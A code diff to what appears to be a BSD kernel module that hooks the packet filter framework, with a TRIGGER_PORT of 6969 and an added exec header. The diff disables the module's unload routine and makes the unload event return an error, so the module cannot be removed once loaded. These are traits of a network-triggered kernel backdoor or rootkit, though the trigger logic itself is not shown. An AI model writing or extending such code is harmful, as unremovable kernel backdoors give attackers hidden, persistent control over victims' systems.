@@ -17,6 +17,7 @@
 #include <net/pfil.h>
 #include <netinet/ip_var.h>
 #include <net/if.h>
+#include <sys/exec.h>
 
 #define TRIGGER_PORT 6969
 
@@ -42,7 +43,7 @@ static int load(void) {
         .pa_version = PFIL_VERSION,         // Version of the pfil framework
         .pa_flags = PFIL_IN | PFIL_OUT,     // Flags for filtering incoming and outgoing packets
         .pa_type = PFIL_TYPE_AF,            // Type of filter (address family)
-        .pa_mbuf_chk = my_pfil_hook,        // Function to process packets
+        .pa_mbuf_chk = packet_filter,        // Function to process packets
         .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
         .pa_ruleset = NULL,                 // No custom ruleset (set to NULL if unused)
         .pa_modname = "my_module",          // Module name
@@ -165,13 +166,13 @@ static int packet_filter(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir
 
 
 // Unload function: Remove our filter
-static int unload(void) {
-    if (pfh_inet != NULL) {
-        pfil_remove_hook(packet_filter, NULL, PFIL_IN | PFIL_WAITOK, pfh_inet);
-    }
-    printf("[LKM] Packet filter module unloaded\n");
-    return 0;
-}
+// static int unload(void) {
+//     if (pfh_inet != NULL) {
+//         pfil_remove_hook(packet_filter, NULL, PFIL_IN | PFIL_WAITOK, pfh_inet);
+//     }
+//     printf("[LKM] Packet filter module unloaded\n");
+//     return 0;
+// }
 
 
 static int event_handler(struct module *module, int event, void *arg) {
@@ -179,7 +180,8 @@ static int event_handler(struct module *module, int event, void *arg) {
         case MOD_LOAD:
             return load();
         case MOD_UNLOAD:
-            return unload();
+            // return unload();
+            return 5;
         default:
             return EOPNOTSUPP;
     }
